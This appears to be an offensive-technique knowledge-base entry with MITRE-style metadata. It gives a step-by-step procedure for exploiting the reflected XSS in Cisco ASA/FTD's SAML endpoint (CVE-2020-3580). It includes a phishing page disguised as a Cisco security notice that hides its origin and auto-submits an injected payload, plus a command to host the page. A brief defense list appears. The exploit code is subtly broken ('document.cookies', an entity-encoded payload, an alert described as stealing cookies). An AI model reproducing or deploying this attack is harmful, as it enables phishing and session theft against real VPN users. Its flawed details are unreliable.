---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
name: Craft-Malicious-HTML-for-Cisco-XSS-Delivery
tags:
  - xss
  - html-craft
  - saml-payload
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:02.440Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-Malicious-HTML-for-Cisco-XSS-Delivery

## Summary

This procedure involves creating an HTML page with embedded JavaScript to deliver a reflected XSS payload targeting the SAMLResponse parameter in Cisco ASA/FTD web interfaces vulnerable to CVE-2020-3580. The page auto-submits a form to inject the payload, enabling arbitrary JavaScript execution upon victim interaction.

## Description

In the context of exploiting CVE-2020-3580, this procedure crafts a phishing-friendly HTML file that mimics a legitimate page while pushing the browser history to obscure the origin and automatically POSTing a malicious SAMLResponse to the target's SAML assertion consumer service. The vulnerability arises from insufficient sanitization of the SAMLResponse parameter at `/+CSCOE+/saml/sp/acs?tgname=a`, allowing HTML/JS injection. Prerequisites include knowledge of the target's hostname and a local web server for hosting. Expected outcomes: seamless payload delivery leading to XSS execution, such as alerting cookies or exfiltrating session data.

## Requirements

1. Text editor to create the HTML file
2. Web server to host the HTML (e.g., accessible via HTTP)
3. Target's Cisco ASA/FTD endpoint details (hostname/IP)

## Defense

Defensive measures and detection strategies:

- Patch to Cisco ASA/FTD versions addressing CVE-2020-3580
- Implement Content Security Policy (CSP) to block inline scripts
- Monitor for anomalous POST requests to SAML endpoints and phishing indicators in email logs

## Objectives

1. Deliver XSS payload without alerting the victim to the redirection
2. Ensure compatibility with AnyConnect/WebVPN user agents
3. Enable customization for data exfiltration beyond alerting

## Instructions

### Step 1: Create the Malicious HTML File

**Context**: Build the HTML with JavaScript to handle state push and form submission, embedding the XSS payload in the SAMLResponse field.

Create a file named `xss-poc.html` with the following content:

```html
<!DOCTYPE html>
<html>
<head><title>Cisco Security Notification</title></head>
<body>
<script>
    history.pushState('', '', '/');
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://[target]/+CSCOE+/saml/sp/acs?tgname=a';
    var input = document.createElement('input');
    input.type = 'hidden';
    input.name = 'SAMLResponse';
    input.value = '"&gt;&lt;svg/onload=alert(document.cookies)&gt;';
    form.appendChild(input);
    document.body.appendChild(form);
    form.submit();
</script>
<p>Redirecting to secure login...</p>
</body>
</html>
```

Replace `[target]` with the actual target hostname (e.g., `cisco-vpn.example.com`). Save the file.

> This script creates and submits a form invisibly, injecting the payload that breaks out of the SAML context to execute the SVG-based onload alert stealing cookies.

### Step 2: Host the HTML Page

**Context**: Serve the file on a web server to make it accessible via a URL for phishing.

Use a simple HTTP server. For example, navigate to the directory containing `xss-poc.html` and run:

```bash
python3 -m http.server 8000
```

Access it at `http://your-ip:8000/xss-poc.html` to test.

> Successful hosting allows the page to load and auto-submit without errors, confirming the payload is ready for delivery.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- cve-2020-3580
- saml
